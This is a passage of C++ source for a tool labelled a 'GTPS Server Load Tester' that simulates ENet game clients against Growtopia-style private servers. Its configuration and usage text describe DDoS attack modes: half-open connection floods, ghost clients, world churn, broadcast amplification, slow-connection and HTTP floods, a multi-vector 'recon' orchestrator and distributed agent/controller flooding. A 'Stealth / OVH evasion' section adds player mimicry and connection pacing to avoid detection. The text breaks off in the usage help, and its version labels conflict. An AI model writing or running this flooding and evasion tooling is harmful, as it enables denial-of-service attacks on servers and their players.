// ============================================================================
// server_load_tester_v6.cpp — GTPS Server Load Tester v6
//
// Simulation Realism Score: 5/5
//   v2: Raw UDP + RTT measurement, traffic patterns
//   v3: Full game client state machine, world joins
//   v4: Tile burst, io_uring, scenario scripting, PID adaptive
//   v5: Crowded world fanout, variable clients per scenario phase
//   v6: Multi-source distributed testing (agent + controller modes)
//
// *** FOR USE ON YOUR OWN SERVER OR WITH EXPLICIT WRITTEN PERMISSION ONLY ***
//
// Build:
//   g++ -O2 -std=c++17 -pthread -o slt server_load_tester_v6.cpp -lenet
//   g++ -O2 -std=c++17 -pthread -DUSE_NCURSES -o slt server_load_tester_v6.cpp -lenet -lncurses
//   g++ -O2 -std=c++17 -pthread -DUSE_IO_URING -o slt server_load_tester_v6.cpp -lenet -luring
// ============================================================================

#include <algorithm>
#include <atomic>
#include <cassert>
#include <chrono>
#include <climits>
#include <cmath>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <numeric>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include <enet/enet.h>

#ifdef USE_NCURSES
#  include <ncurses.h>
#endif
#ifdef USE_IO_URING
#  include <liburing.h>
#endif

// ============================================================================
// Constants
// ============================================================================

#define GTPS_SLT_VERSION        "v11"
#define DEFAULT_PPS             1000
#define DEFAULT_CLIENTS         10
#define DEFAULT_HOSTS           4
#define DEFAULT_THREADS         2
#define DEFAULT_DURATION        60
#define DEFAULT_WARMUP          10
#define DEFAULT_PORT            17091
#define DEFAULT_CROWD_STAY_MS   120000
#define DEFAULT_TILE_BURST_COUNT 10
#define DEFAULT_TILE_BURST_MS   3000
#define DEFAULT_AGENT_PORT      9000
#define WORLD_JOIN_DELAY_MS     600
#define CROWD_LOBBY_DELAY_MS    50
#define WORLD_STAY_MIN_MS       30000
#define WORLD_STAY_MAX_MS       90000
#define RTT_RING_SIZE           8192
#define MMSG_BATCH              64
#define AGENT_CTRL_BUFSIZE      4096
#define CTRL_T0_LEAD_MS         2500   // controller: agents start this many ms after HELLO exchange

// ============================================================================
// GTPS / ENet protocol constants
// ============================================================================

#define NET_MESSAGE_GENERIC_TEXT    2
#define NET_MESSAGE_GAME_PACKET     3
#define NET_MESSAGE_GAME_MESSAGE    5

#pragma pack(push, 1)
struct TankPacket {
    uint8_t  type;
    uint8_t  objtype_id;
    uint8_t  count_1;
    uint8_t  count_2;
    int32_t  building_x;
    int32_t  building_y;
    int32_t  padding;
    float    x, y;
    float    xspeed, yspeed;
    int32_t  value;
    uint32_t itemID;
};
#pragma pack(pop)

// ============================================================================
// Utility: time helpers
// ============================================================================

static inline int64_t now_ms() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}
static inline int64_t now_us() {
    return std::chrono::duration_cast<std::chrono::microseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}
static inline int64_t epoch_ms() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
}

// ============================================================================
// Utility: random helpers
// ============================================================================

static thread_local std::mt19937 tl_rng(std::random_device{}());

static int rng_range(int lo, int hi) {
    if (lo >= hi) return lo;
    return std::uniform_int_distribution<int>(lo, hi)(tl_rng);
}

// ============================================================================
// TokenBucket — rate limiter
// ============================================================================

struct TokenBucket {
    double rate_pps;
    double tokens;
    int64_t last_refill_us;

    explicit TokenBucket(double r = 1000.0)
        : rate_pps(r < 1.0 ? 1.0 : r), tokens(r < 1.0 ? 1.0 : r), last_refill_us(now_us()) {}

    void set_rate(double r) {
        if (r < 1.0) r = 1.0;
        rate_pps = r;
    }

    // Wait until a token is available, then consume it
    void consume(int n = 1) {
        while (true) {
            int64_t now = now_us();
            double elapsed = (now - last_refill_us) * 1e-6;
            tokens += elapsed * rate_pps;
            if (tokens > rate_pps) tokens = rate_pps;
            last_refill_us = now;
            if (tokens >= n) {
                tokens -= n;
                return;
            }
            double wait_sec = (n - tokens) / rate_pps;
            int64_t wait_us = (int64_t)(wait_sec * 1e6);
            if (wait_us > 1000) wait_us = 1000;
            if (wait_us > 0) usleep((useconds_t)wait_us);
        }
    }
};

// ============================================================================
// RTTHistogram — ring buffer + percentile computation
// ============================================================================

struct RTTHistogram {
    uint64_t ring[RTT_RING_SIZE]{};
    int      head{0};
    int      count{0};
    mutable std::mutex mtx;

    void record(uint64_t rtt_us) {
        std::lock_guard<std::mutex> lk(mtx);
        ring[head] = rtt_us;
        head = (head + 1) % RTT_RING_SIZE;
        if (count < RTT_RING_SIZE) count++;
    }

    // Returns percentile (0–100) from ring buffer snapshot
    uint64_t percentile(int pct) const {
        std::lock_guard<std::mutex> lk(mtx);
        if (count == 0) return 0;
        std::vector<uint64_t> v(ring, ring + count);
        std::sort(v.begin(), v.end());
        size_t idx = (size_t)((pct / 100.0) * (v.size() - 1) + 0.5);
        return v[idx];
    }

    void merge_from(const RTTHistogram& other) {
        std::lock_guard<std::mutex> lk(mtx);
        std::lock_guard<std::mutex> lk2(other.mtx);
        int n = other.count < RTT_RING_SIZE ? other.count : RTT_RING_SIZE;
        for (int i = 0; i < n; i++) {
            ring[head] = other.ring[i];
            head = (head + 1) % RTT_RING_SIZE;
            if (count < RTT_RING_SIZE) count++;
        }
    }

    void reset() {
        std::lock_guard<std::mutex> lk(mtx);
        head = 0; count = 0;
    }
};

// ============================================================================
// TrafficPattern — generates per-tick pps target
// ============================================================================

enum class PatternType { CONSTANT=0, BURST, RAMP, SINUSOIDAL, RANDOM };

struct TrafficParams {
    double constant_pps        = 1000.0;
    double burst_pps           = 50000.0;
    double idle_pps            = 0.0;
    double burst_duration_ms   = 200.0;
    double idle_duration_ms    = 800.0;
    double ramp_start_pps      = 1000.0;
    double ramp_end_pps        = 50000.0;
    double ramp_duration_sec   = 60.0;
    double sin_base_pps        = 1000.0;
    double sin_amplitude       = 300.0;
    double sin_period_sec      = 30.0;
    double rw_start_pps        = 1000.0;
    double rw_step_max         = 200.0;
    double rw_update_ms        = 500.0;
};

struct TrafficPattern {
    PatternType   type    = PatternType::CONSTANT;
    TrafficParams params;
    int64_t       start_ms = 0;
    double        rw_current = 0.0;
    int64_t       rw_last_update = 0;

    void reset(PatternType t, const TrafficParams& p) {
        type = t; params = p;
        start_ms = now_ms();
        rw_current = p.rw_start_pps;
        rw_last_update = start_ms;
    }

    double current_pps() {
        int64_t t = now_ms();
        double elapsed_ms  = (double)(t - start_ms);
        double elapsed_sec = elapsed_ms * 1e-3;
        switch (type) {
            case PatternType::CONSTANT:
                return params.constant_pps;
            case PatternType::BURST: {
                double period = params.burst_duration_ms + params.idle_duration_ms;
                double phase  = fmod(elapsed_ms, period);
                return (phase < params.burst_duration_ms) ? params.burst_pps : params.idle_pps;
            }
            case PatternType::RAMP: {
                if (params.ramp_duration_sec <= 0) return params.ramp_end_pps;
                double frac = std::min(1.0, elapsed_sec / params.ramp_duration_sec);
                return params.ramp_start_pps + frac * (params.ramp_end_pps - params.ramp_start_pps);
            }
            case PatternType::SINUSOIDAL: {
                double omega = (params.sin_period_sec > 0)
                    ? (2.0 * M_PI / params.sin_period_sec) : 0.0;
                return params.sin_base_pps + params.sin_amplitude * sin(omega * elapsed_sec);
            }
            case PatternType::RANDOM: {
                if ((t - rw_last_update) >= (int64_t)params.rw_update_ms) {
                    double step = std::uniform_real_distribution<double>(
                        -params.rw_step_max, params.rw_step_max)(tl_rng);
                    rw_current = std::max(1.0, rw_current + step);
                    rw_last_update = t;
                }
                return rw_current;
            }
        }
        return params.constant_pps;
    }
};

// ============================================================================
// PhaseState — live scenario state, read by all workers
// ============================================================================

struct PhaseState {
    std::atomic<int>  pps             { DEFAULT_PPS };
    std::atomic<int>  tile_burst_count{ DEFAULT_TILE_BURST_COUNT };
    std::atomic<int>  tile_burst_ms   { DEFAULT_TILE_BURST_MS };
    std::atomic<int>  pattern_idx     { 0 };
    std::atomic<int>  phase_num       { 1 };
    std::atomic<int>  target_clients  { 0 };   // 0 = use cfg.clients
    std::atomic<bool> crowd_mode      { false };
    std::atomic<int>  crowd_stay_ms   { DEFAULT_CROWD_STAY_MS };
    // world and phase_name are string → protected by mutex
    std::string       world;
    std::string       phase_name;
    std::mutex        name_mtx;

    std::string get_world() {
        std::lock_guard<std::mutex> lk(name_mtx);
        return world;
    }
    std::string get_phase_name() {
        std::lock_guard<std::mutex> lk(name_mtx);
        return phase_name;
    }
    void set_world(const std::string& w) {
        std::lock_guard<std::mutex> lk(name_mtx);
        world = w;
    }
    void set_phase_name(const std::string& n) {
        std::lock_guard<std::mutex> lk(name_mtx);
        phase_name = n;
    }
};

// ============================================================================
// ThreadStats — per-thread counters (cache-line aligned)
// ============================================================================

struct PeakStats {
    std::mutex   mtx;
    double       pps_peak  = 0.0;
    double       mbps_peak = 0.0;
};

struct alignas(64) ThreadStats {
    std::atomic<uint64_t> packets_sent   {0};
    std::atomic<uint64_t> bytes_sent     {0};
    std::atomic<uint64_t> errors         {0};
    std::atomic<uint64_t> send_failures  {0};
    std::atomic<uint64_t> last_rtt_us    {0};
    std::atomic<uint64_t> world_bytes_rx {0};
    std::atomic<uint64_t> world_joins    {0};
    std::atomic<uint64_t> tile_bursts    {0};
    std::atomic<int>      active_clients {0};   // [v5] non-draining clients
    std::atomic<uint64_t> rtt_samples    {0};   // [v7] verify-connect responses / http rtt count
    RTTHistogram          rtt_hist;
};

// ============================================================================
// Global state
// ============================================================================

static std::atomic<bool>  g_running    {true};
static std::atomic<bool>  g_in_warmup  {false};
static std::atomic<int>   g_clients_in_world {0};  // [v5]
static PhaseState         g_phase;
static PeakStats          g_peaks;
static RTTHistogram       g_global_rtt;

static std::vector<std::unique_ptr<ThreadStats>> g_stats;

// ============================================================================
// TrafficParams builder from phase PPS
// ============================================================================

struct Config; // forward

static TrafficParams make_phase_tp(const TrafficParams& base, int phase_pps) {
    TrafficParams tp = base;
    tp.constant_pps  = phase_pps;
    tp.sin_base_pps  = phase_pps;
    tp.rw_start_pps  = phase_pps;
    return tp;
}

// ============================================================================
// GameClientSimulatorV6 — per-client ENet state machine (same as v5)
// ============================================================================

enum class ClientState {
    CONNECTING, WAITING_LOGIN, IN_LOBBY, JOINING_WORLD, IN_WORLD, DISCONNECTED
};

struct HostGroup {
    ENetHost*                               host    = nullptr;
    std::vector<struct GameClientSimV6*>    clients;
};

struct GameClientSimV6 {
    ENetHost*    enet_host   = nullptr;
    ENetPeer*    peer        = nullptr;
    ClientState  state       = ClientState::CONNECTING;
    int64_t      state_enter = 0;
    int64_t      last_burst  = 0;
    bool         drain_      = false;  // [v5] if true, do not reconnect after disconnect
    uint64_t     rtt_us      = 0;
    int          thread_idx  = 0;

    void reset_state() {
        if (peer) { enet_peer_disconnect_now(peer, 0); peer = nullptr; }
        if (!drain_) {
            state = ClientState::CONNECTING;
            state_enter = now_ms();
        } else {
            state = ClientState::DISCONNECTED;
        }
    }

    bool is_draining() const { return drain_; }

    void on_connect() {
        state = ClientState::WAITING_LOGIN;
        state_enter = now_ms();
        // Send login
        char buf[128];
        int len = snprintf(buf, sizeof(buf),
            "requestedName|loadbot_%d_%ld\nprotocol|179\n",
            thread_idx, (long)now_ms());
        if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
        ENetPacket* pkt = enet_packet_create(buf, len, ENET_PACKET_FLAG_RELIABLE);
        uint8_t hdr = NET_MESSAGE_GENERIC_TEXT;
        // prepend 4-byte header: [type][0][0][0]
        ENetPacket* full = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
        ((uint8_t*)full->data)[0] = hdr;
        ((uint8_t*)full->data)[1] = 0;
        ((uint8_t*)full->data)[2] = 0;
        ((uint8_t*)full->data)[3] = 0;
        memcpy((uint8_t*)full->data + 4, buf, len);
        enet_packet_destroy(pkt);
        enet_peer_send(peer, 0, full);
    }

    void on_receive(ENetPacket* pkt, ThreadStats& ts) {
        if (!pkt || pkt->dataLength < 4) return;
        uint8_t msg_type = ((uint8_t*)pkt->data)[0];
        // Track received bytes for world load metric
        ts.world_bytes_rx.fetch_add(pkt->dataLength, std::memory_order_relaxed);

        if (state == ClientState::WAITING_LOGIN && msg_type == NET_MESSAGE_GENERIC_TEXT) {
            // Transition to lobby
            state = ClientState::IN_LOBBY;
            state_enter = now_ms();
        }
        if (state == ClientState::JOINING_WORLD && msg_type == NET_MESSAGE_GENERIC_TEXT) {
            // Check for spawn packet (simplified: any generic text after join_request)
            const char* text = (const char*)pkt->data + 4;
            if (pkt->dataLength > 4 && (
                strstr(text, "action|spawn") != nullptr ||
                strstr(text, "OnSpawn")      != nullptr)) {
                state = ClientState::IN_WORLD;
                state_enter = now_ms();
                g_clients_in_world.fetch_add(1, std::memory_order_relaxed);
                ts.world_joins.fetch_add(1, std::memory_order_relaxed);
            }
        }
        if (peer) {
            // ENet gives RTT in ms, convert to us
            uint64_t rtt = (uint64_t)peer->roundTripTime * 1000;
            ts.last_rtt_us.store(rtt, std::memory_order_relaxed);
            ts.rtt_hist.record(rtt);
            rtt_us = rtt;
        }
    }

    void on_disconnect() {
        if (state == ClientState::IN_WORLD)
            g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
        peer = nullptr;
        if (!drain_) {
            state = ClientState::CONNECTING;
            state_enter = now_ms();
        } else {
            state = ClientState::DISCONNECTED;
        }
    }

    void send_join_world(const std::string& world) {
        char buf[64];
        int len = snprintf(buf, sizeof(buf),
            "action|join_request\nname|%s\n", world.c_str());
        if (len < 0 || len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
        ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
        ((uint8_t*)pkt->data)[1] = 0;
        ((uint8_t*)pkt->data)[2] = 0;
        ((uint8_t*)pkt->data)[3] = 0;
        memcpy((uint8_t*)pkt->data + 4, buf, len);
        enet_peer_send(peer, 0, pkt);
        state = ClientState::JOINING_WORLD;
        state_enter = now_ms();
    }

    void send_leave() {
        if (!peer) return;
        const char* msg = "action|quit\n";
        int len = (int)strlen(msg);
        ENetPacket* pkt = enet_packet_create(nullptr, len + 4, ENET_PACKET_FLAG_RELIABLE);
        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GENERIC_TEXT;
        memset((uint8_t*)pkt->data + 1, 0, 3);
        memcpy((uint8_t*)pkt->data + 4, msg, len);
        enet_peer_send(peer, 0, pkt);
    }

    void send_move(ThreadStats& ts) {
        if (!peer || state != ClientState::IN_WORLD) return;
        TankPacket tp{};
        tp.type = 0;
        tp.x = (float)rng_range(0, 100);
        tp.y = (float)rng_range(0, 60);
        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, 0);
        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
        memset((uint8_t*)pkt->data + 1, 0, 3);
        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
        enet_peer_send(peer, 1, pkt);
        ts.packets_sent.fetch_add(1, std::memory_order_relaxed);
        ts.bytes_sent.fetch_add(pkt->dataLength, std::memory_order_relaxed);
    }

    void send_tile_burst(ThreadStats& ts, int count) {
        if (!peer || state != ClientState::IN_WORLD) return;
        for (int i = 0; i < count; i++) {
            TankPacket tp{};
            tp.type          = 3;
            tp.itemID        = 18;
            tp.building_x    = rng_range(0, 100);
            tp.building_y    = rng_range(0, 60);
            ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4,
                                                  ENET_PACKET_FLAG_RELIABLE);
            ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
            memset((uint8_t*)pkt->data + 1, 0, 3);
            memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
            enet_peer_send(peer, 0, pkt);
        }
        ts.tile_bursts.fetch_add(1, std::memory_order_relaxed);
        ts.packets_sent.fetch_add(count, std::memory_order_relaxed);
        ts.bytes_sent.fetch_add((sizeof(TankPacket) + 4) * count, std::memory_order_relaxed);
    }

    void send_ping(ThreadStats& ts) {
        if (!peer) return;
        TankPacket tp{};
        tp.type = 0x16;
        ENetPacket* pkt = enet_packet_create(nullptr, sizeof(TankPacket) + 4, 0);
        ((uint8_t*)pkt->data)[0] = NET_MESSAGE_GAME_PACKET;
        memset((uint8_t*)pkt->data + 1, 0, 3);
        memcpy((uint8_t*)pkt->data + 4, &tp, sizeof(TankPacket));
        enet_peer_send(peer, 1, pkt);
        ts.packets_sent.fetch_add(1, std::memory_order_relaxed);
        ts.bytes_sent.fetch_add(pkt->dataLength, std::memory_order_relaxed);
    }

    // Per-tick update; returns true if still active
    void update(ThreadStats& ts, const std::string& world) {
        int64_t t = now_ms();
        int64_t in_state = t - state_enter;

        bool crowd  = g_phase.crowd_mode.load(std::memory_order_relaxed);
        int  t_burst= g_phase.tile_burst_count.load(std::memory_order_relaxed);
        int  ms_burst= g_phase.tile_burst_ms.load(std::memory_order_relaxed);

        switch (state) {
            case ClientState::CONNECTING:
                if (peer) {
                    // connection attempt pending, handled by ENet service
                } else {
                    // peer is null — need to reconnect; caller handles
                }
                break;
            case ClientState::WAITING_LOGIN:
                if (in_state > 5000) reset_state();
                break;
            case ClientState::IN_LOBBY: {
                int delay = crowd ? CROWD_LOBBY_DELAY_MS : WORLD_JOIN_DELAY_MS;
                if (in_state > delay) {
                    send_join_world(world);
                }
                break;
            }
            case ClientState::JOINING_WORLD:
                if (in_state > 8000) {
                    // Timeout — treat as lobby
                    state = ClientState::IN_LOBBY;
                    state_enter = t;
                }
                break;
            case ClientState::IN_WORLD: {
                int stay;
                if (crowd) {
                    stay = g_phase.crowd_stay_ms.load(std::memory_order_relaxed);
                } else {
                    stay = rng_range(WORLD_STAY_MIN_MS, WORLD_STAY_MAX_MS);
                    // Re-roll happens each tick but net effect is correct distribution
                }
                // Tile burst
                if (ms_burst > 0 && (t - last_burst) >= ms_burst) {
                    send_tile_burst(ts, t_burst);
                    last_burst = t;
                }
                // Move every ~500ms
                if ((t % 500) < 50) send_move(ts);
                // Leave after stay
                if (!crowd && in_state > stay) {
                    if (state == ClientState::IN_WORLD)
                        g_clients_in_world.fetch_sub(1, std::memory_order_relaxed);
                    send_leave();
                    state = ClientState::IN_LOBBY;
                    state_enter = t;
                }
                break;
            }
            case ClientState::DISCONNECTED:
                break;
        }
    }
};

// ============================================================================
// Config struct
// ============================================================================

static const std::map<std::string, PatternType> PATTERN_MAP = {
    {"constant",   PatternType::CONSTANT},
    {"burst",      PatternType::BURST},
    {"ramp",       PatternType::RAMP},
    {"sinusoidal", PatternType::SINUSOIDAL},
    {"random",     PatternType::RANDOM},
};

struct Config {
    // General
    std::string   mode          = "game";   // udp | game | agent | controller
    std::string   target        = "127.0.0.1";
    uint16_t      port          = DEFAULT_PORT;
    int           threads       = DEFAULT_THREADS;
    int           pps           = DEFAULT_PPS;
    int           duration      = DEFAULT_DURATION;
    int           warmup        = DEFAULT_WARMUP;
    int           clients       = DEFAULT_CLIENTS;
    int           hosts         = DEFAULT_HOSTS;
    std::string   world         = "START";
    // Tile burst
    int           tile_burst_count = DEFAULT_TILE_BURST_COUNT;
    int           tile_burst_ms    = DEFAULT_TILE_BURST_MS;
    // v5 crowd
    bool          crowd_mode    = false;
    int           crowd_stay_ms = DEFAULT_CROWD_STAY_MS;
    // Traffic pattern
    PatternType   pattern       = PatternType::CONSTANT;
    TrafficParams tp;
    // PID adaptive
    bool          adaptive      = false;
    double        target_rtt_us = 50000.0;
    double        pid_kp        = 0.10, pid_ki = 0.01, pid_kd = 0.05;
    // Scenario
    std::string   scenario_file;
    // Output
    std::string   csv_file;
    bool          dashboard     = false;
    bool          xor_obfusc   = false;
    bool          jitter        = false;
    // v6: Agent mode
    int           agent_port    = DEFAULT_AGENT_PORT;
    std::string   agent_secret;
    // v6: Controller mode
    std::vector<std::string> agent_addrs; // "ip:port"
    // v7: Canary mode
    std::string canary_world  = "START";
    int64_t     sync_time_ms  = 0;   // --sync-time UNIX_MS → align CSV timestamps
    // v7: Attack modes
    std::string attack_type;          // enet-halfopen | ghost | world-churn | login-ghost | broadcast-amp
    std::string ghost_after = "world"; // login | join | world — at which point to go idle
    int         churn_stay_ms = 200;  // --churn-stay-ms N — how long to stay before quit
    std::vector<std::string> world_list; // --world-list A,B,C — cycle worlds in churn mode
    int         broadcast_burst_ms = 100;
    // v7: UDP improvements (M7)
    std::string udp_size     = "fixed";   // fixed | min | max | mixed | enet
    std::string payload_type = "garbage"; // garbage | zero | enet-valid
    // v7.2: multi-peer + new methods
    int         peers_per_thread = 1;     // --peers-per-thread N (F1: multi-peer)
    int         slow_interval_ms = 8000;  // --slow-interval-ms N (M-SLOW: 1 new conn per N ms)
    std::string http_target;              // --http-target URL (HTTP flood, non-ENet)
    int         http_rps     = 50;        // --http-rps N (requests per second per thread)
    // v10: Multi-vector orchestrator
    int         total_connections = 200;  // --total-connections N
    std::string scenario_roles;           // --roles "ghost:40,churn:30,amp:30"
    int         rotate_sec    = 0;        // --rotate-sec N (rotate vector allocation every N sec)
    int         ramp_sec      = 30;       // --ramp-sec N (connection ramp-up period)
    std::string mv_scenario_file;         // --mv-scenario FILE (multi-vector scenario INI)
    // v7: Recovery measurement
    int         cooldown_sec  = 0;    // --cooldown-sec N — probe RTT after flood stops
    // v7.1: Stealth / OVH evasion
    bool        stealth         = false;  // --stealth: enable all evasion features
    int         connect_rate    = 0;      // --connect-rate N: max CONNECT/sec per thread (0=unlimited)
    bool        mimic_player    = false;  // --mimic-player: send occasional movement/chat
    bool        randomize_names = false;  // --randomize-names: random player names
    int         jitter_ms       = 0;      // --jitter-ms N: random delay ±N ms between actions
};

// ============================================================================
// INI / CLI parser
// ============================================================================

static std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    size_t b = s.find_last_not_of(" \t\r\n");
    return (a == std::string::npos) ? "" : s.substr(a, b - a + 1);
}

static std::map<std::string, std::string> load_ini_section(
    const std::string& path, const std::string& section)
{
    std::map<std::string, std::string> kv;
    std::ifstream f(path);
    if (!f.is_open()) return kv;
    std::string cur_section;
    std::string line;
    while (std::getline(f, line)) {
        auto s = trim(line);
        if (s.empty() || s[0] == '#' || s[0] == ';') continue;
        if (s[0] == '[') {
            cur_section = s.substr(1, s.size() - 2);
            continue;
        }
        if (cur_section != section) continue;
        auto eq = s.find('=');
        if (eq == std::string::npos) continue;
        kv[trim(s.substr(0, eq))] = trim(s.substr(eq + 1));
    }
    return kv;
}

// Load all phase section names from scenario INI
static std::vector<std::string> ini_phase_sections(const std::string& path) {
    std::vector<std::string> secs;
    std::ifstream f(path);
    std::string line;
    while (std::getline(f, line)) {
        auto s = trim(line);
        if (s.size() > 2 && s[0] == '[' && s.back() == ']') {
            std::string sec = s.substr(1, s.size() - 2);
            if (sec.substr(0, 5) == "phase") secs.push_back(sec);
        }
    }
    return secs;
}

static void apply_ini_general(Config& cfg, const std::string& ini_path) {
    auto kv = load_ini_section(ini_path, "general");
    auto g   = [&](const std::string& k, const std::string& d="") -> std::string {
        auto it = kv.find(k); return (it != kv.end()) ? it->second : d;
    };
    auto gi  = [&](const std::string& k, int d) -> int {
        auto it = kv.find(k); return (it != kv.end()) ? std::stoi(it->second) : d;
    };
    auto gb  = [&](const std::string& k, bool d) -> bool {
        auto it = kv.find(k);
        if (it == kv.end()) return d;
        auto& v = it->second;
        return v == "true" || v == "1" || v == "yes";
    };

    if (!g("mode").empty())      cfg.mode     = g("mode");
    if (!g("target").empty())    cfg.target   = g("target");
    if (kv.count("port"))        cfg.port     = (uint16_t)gi("port", DEFAULT_PORT);
    if (kv.count("threads"))     cfg.threads  = gi("threads", DEFAULT_THREADS);
    if (kv.count("pps"))         cfg.pps      = gi("pps", DEFAULT_PPS);
    if (kv.count("duration"))    cfg.duration = gi("duration", DEFAULT_DURATION);
    if (kv.count("warmup"))      cfg.warmup   = gi("warmup", DEFAULT_WARMUP);
    if (kv.count("clients"))     cfg.clients  = gi("clients", DEFAULT_CLIENTS);
    if (kv.count("hosts"))       cfg.hosts    = gi("hosts", DEFAULT_HOSTS);
    if (!g("world").empty())     cfg.world    = g("world");
    if (kv.count("tile_burst_count")) cfg.tile_burst_count = gi("tile_burst_count", DEFAULT_TILE_BURST_COUNT);
    if (kv.count("tile_burst_ms"))    cfg.tile_burst_ms    = gi("tile_burst_ms", DEFAULT_TILE_BURST_MS);
    if (kv.count("crowd_mode"))  cfg.crowd_mode    = gb("crowd_mode", false);
    if (kv.count("crowd_stay_ms")) cfg.crowd_stay_ms = gi("crowd_stay_ms", DEFAULT_CROWD_STAY_MS);
    if (kv.count("adaptive"))    cfg.adaptive      = gb("adaptive", false);
    if (!g("scenario").empty())  cfg.scenario_file = g("scenario");
    if (!g("csv").empty())       cfg.csv_file      = g("csv");
    if (kv.count("dashboard"))   cfg.dashboard     = gb("dashboard", false);
    if (kv.count("agent_port"))  cfg.agent_port    = gi("agent_port", DEFAULT_AGENT_PORT);
    if (!g("agent_secret").empty()) cfg.agent_secret = g("agent_secret");

    // Pattern
    auto ps = g("pattern", "constant");
    auto pit = PATTERN_MAP.find(ps);
    if (pit != PATTERN_MAP.end()) cfg.pattern = pit->second;

    // Traffic params
    auto kv2 = load_ini_section(ini_path, "traffic");
    auto gd  = [&](const std::string& k, double d) -> double {
        auto it = kv2.find(k); return (it != kv2.end()) ? std::stod(it->second) : d;
    };
    cfg.tp.constant_pps       = gd("constant_pps",            cfg.pps);
    cfg.tp.burst_pps          = gd("burst_pps",               50000.0);
    cfg.tp.idle_pps           = gd("idle_pps",                0.0);
    cfg.tp.burst_duration_ms  = gd("burst_duration_ms",       200.0);
    cfg.tp.idle_duration_ms   = gd("idle_duration_ms",        800.0);
    cfg.tp.ramp_start_pps     = gd("ramp_start_pps",          1000.0);
    cfg.tp.ramp_end_pps       = gd("ramp_end_pps",            50000.0);
    cfg.tp.ramp_duration_sec  = gd("ramp_duration_sec",       60.0);
    cfg.tp.sin_base_pps       = gd("sinusoidal_base_pps",     cfg.pps);
    cfg.tp.sin_amplitude      = gd("sinusoidal_amplitude",    cfg.pps * 0.3);
    cfg.tp.sin_period_sec     = gd("sinusoidal_period_sec",   30.0);
    cfg.tp.rw_start_pps       = gd("random_walk_start_pps",   cfg.pps);
    cfg.tp.rw_step_max        = gd("random_walk_step_max",    200.0);
    cfg.tp.rw_update_ms       = gd("random_walk_update_interval_ms", 500.0);

    // PID
    auto kv3 = load_ini_section(ini_path, "pid");
    auto gp  = [&](const std::string& k, double d) -> double {
        auto it = kv3.find(k); return (it != kv3.end()) ? std::stod(it->second) : d;
    };
    cfg.pid_kp      = gp("kp", 0.10);
    cfg.pid_ki      = gp("ki", 0.01);
    cfg.pid_kd      = gp("kd", 0.05);
    cfg.target_rtt_us = gp("target_rtt", 50.0) * 1000.0; // ms → us
}

static void print_usage(const char* prog) {
    printf(
        "GTPS Server Load Tester %s\n\n"
        "Usage:\n"
        "  %s [options]\n\n"
        "Modes:\n"
        "  --mode game        Full game client simulation\n"
        "  --mode attack      DDoS resilience testing (requires --attack-type)\n"
        "  --mode recon       Quick reconnaisance: auto multi-vector attack (alias for attack+orchestrator)\n"
        "  --mode udp         Raw UDP flood\n"
        "  --mode canary      Single client RTT monitor\n"
        "  --mode agent       Listen for controller, run test on command\n"
        "  --mode controller  Coordinate multiple agents\n\n"
        "Common options:\n"
        "  --config FILE      Load INI config file\n"
        "  --target IP        Target server IP\n"
        "  --port N           Target server port (default: %d)\n"
        "  --threads N        Worker threads\n"
        "  --pps N            Target packets per second\n"
        "  --duration N       Test duration in seconds\n"
        "  --clients N        Simulated game clients\n"
        "  --world NAME       World to join\n"
        "  --crowd            Enable crowd mode (all clients same world)\n"
        "  --crowd-stay-ms N  Crowd mode stay duration (default: %d)\n"
        "  --scenario FILE    Scenario INI file\n"
        "  --csv FILE         Write per-second stats to CSV\n"
        "  --adaptive         Enable PID adaptive rate control\n"
        "  --target-rtt N     PID target RTT in ms\n"
        "  --dashboard        Enable ncurses dashboard (requires -DUSE_NCURSES)\n\n"
        "Agent mode (--mode agent):\n"
        "  --agent-port N     TCP port to listen on (default: %d)\n"
        "  --agent-secret S   Shared secret for controller handshake\n\n"
        "Controller mode (--mode controller):\n"
        "  --agents A,B,...   Agent addresses as ip:port (e.g. 10.0.0.1:9000,10.0.0.2:9000)\n"
        "  --secret S         Shared secret (must match agent --agent-secret)\n\n"
        "Canary mode (--mode canary):\n"
        "  --canary-world W   World to join and monitor (default: START)\n"
        "  --sync-time UNIX_MS  Align CSV timestamps with controller (optional)\n\n"
        "Recon mode (--mode recon):\n"
        "  Alias for: --mode attack --attack-type orchestrator\n"
        "  Launches multi-vector orchestrator directly. Example:\n"
        "    ./slt --mode recon --target 1.2.3.4 --threads 4 --duration 60\n\n"
        "Attack mode (--mode attack):\n"
        "  --attack-type TYPE   orchestrator | enet-halfopen | ghost | world-churn |\n"
        "                       login-ghost | broadcast-amp | multi-peer | slow | http | threshold\n"
        "  --ghost-after POINT  login | join | world (default: world)\n"
        "  --churn-stay-ms N    World churn cycle time in ms (default: 200)\n"
        "  --world-list A,B,C   Cycle through these worlds in churn mode\n"
        "  --broadcast-burst-ms N  Tile burst interval for broadcast-amp (default: 100)\n\n"
        "UDP mode improvements:\n"
